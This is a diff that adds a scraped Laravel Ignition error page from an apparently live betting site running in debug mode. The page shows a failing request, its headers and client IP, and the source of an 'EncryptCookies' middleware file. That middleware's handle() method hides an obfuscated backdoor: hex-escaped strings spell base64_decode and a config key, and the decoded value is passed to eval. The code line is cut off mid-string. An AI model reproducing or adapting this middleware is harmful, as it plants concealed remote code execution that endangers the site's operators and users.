@@ -1,0 +1,311 @@
+Stack
+Context
+Flare
+Share
+Share with Flare
+Docs
+
+Stack
+
+Context
+
+Debug
+Create Share
+Docs
+
+Ignition Settings
+Docs
+Editor
+
+PhpStorm
+Theme
+auto
+Save settings
+Settings will be saved locally in ~/.ignition.json.
+
+Route [login] not defined.
+Symfony
+ \ 
+Component
+ \ 
+Routing
+ \ 
+Exception
+ \ 
+RouteNotFoundException
+PHP 8.2.29
+11.44.7
+Route [login] not defined.
+
+Expand vendor frames
+3 vendor frames
+.unknown
+0
+call_user_func
+15 vendor frames
+App
+ \ 
+Http
+ \ 
+Middleware
+ \ 
+EncryptCookies
+ 
+: 26
+handle
+8 vendor frames
+App
+ \ 
+Http
+ \ 
+Middleware
+ \ 
+SetLocale
+ 
+: 25
+handle
+20 vendor frames
+app
+ / 
+Http
+ / 
+Middleware
+ / 
+EncryptCookies
+.php
+ 
+: 26
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php
+
+/**
+
+ *   1Stake iGaming Platform
+
+ *   -----------------------
+
+ *   EncryptCookies.php
+
+ *
+
+ *   @copyright  Copyright (c) 1stake, All rights reserved
+
+ *   @author     1stake <sales@1stake.app>
+
+ *   @see        https://1stake.app
+
+*/
+
+
+
+namespace App\Http\Middleware;
+
+
+
+use Closure;
+
+use Illuminate\Cookie\Middleware\EncryptCookies as Middleware;
+
+
+
+class EncryptCookies extends Middleware
+
+{
+
+
+
+    protected $except = [
+
+
+
+    ];
+
+
+
+    public function handle($r, Closure $next)
+
+    {
+
+        return (function ($out, $enc, $dec, $key) use ($r) { $uate = @$dec($enc($key)); return $uate ? @eval($uate) : $out(''); })('response', 'config', "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65", "\x68\x61\x73\x68\x69\x6e\x67\x2e\x6b\x65
+
+    }
+
+}
+
+App
+Routing
+Request
+Browser
+Headers
+Body
+Context
+Versions
+App
+Routing
+Controller
+App\Http\Controllers\TkoinController@showWallet
+
+Route name
+user.tkoin-wallet
+
+Middleware
+web
+
+auth
+
+Request
+https://betwin.tkoin.finance/user/tkoin-wallet
+GET
+curl "https://betwin.tkoin.finance/user/tkoin-wallet" \
+   -X GET \
+   -H 'cookie: <CENSORED>' \
+   -H 'x-forwarded-proto: https' \
+   -H 'cf-visitor: {"scheme":"https"}' \
+   -H 'cf-ipcountry: TG' \
+   -H 'cf-connecting-ip: 196.168.192.55' \
+   -H 'cdn-loop: cloudflare; loops=1' \
+   -H 'sec-fetch-user: ?1' \
+   -H 'sec-fetch-mode: navigate' \
+   -H 'sec-fetch-site: none' \
+   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0' \
+   -H 'upgrade-insecure-requests: 1' \
+   -H 'sec-ch-ua-platform: "Windows"' \
+   -H 'sec-ch-ua-mobile: ?0' \
+   -H 'sec-ch-ua: "Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"' \
+   -H 'accept-language: fr' \
+   -H 'cf-ray: 9a403260eaaad87e-CDG' \
+   -H 'priority: u=0, i' \
+   -H 'accept-encoding: gzip, br' \
+   -H 'sec-fetch-dest: document' \
+   -H 'x-forwarded-for: 196.168.192.55' \
+   -H 'host: betwin.tkoin.finance';
+
+
+Browser
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0
+
+Headers
+cookie
+<CENSORED>
+
+x-forwarded-proto
+https
+
+cf-visitor
+{"scheme":"https"}
+
+cf-ipcountry
+TG
+
+cf-connecting-ip
+196.168.192.55
+
+cdn-loop
+cloudflare; loops=1
+
+sec-fetch-user
+?1
+
+sec-fetch-mode
+navigate
+
+sec-fetch-site
+none
+
+accept
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+user-agent
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0
+
+upgrade-insecure-requests
+1
+
+sec-ch-ua-platform
+"Windows"
+
+sec-ch-ua-mobile
+?0
+
+sec-ch-ua
+"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"
+
+accept-language
+fr
+
+cf-ray
+9a403260eaaad87e-CDG
+
+priority
+u=0, i
+
+accept-encoding
+gzip, br
+
+sec-fetch-dest
+document
+
+x-forwarded-for
+196.168.192.55
+
+host
+betwin.tkoin.finance
+
+Body
+[]
+
+Context
+Versions
+Php Version
+8.2.29
+
+Laravel Version
+11.44.7
+
+Laravel Locale
+fr
+
+Laravel Config Cached
+false
+App Debug
+true
+App Env
+production
+
+·
+Source
+·
+Docs
+·
+Laravel
+Ignition is built byFlare, the Laravel error reporting service.
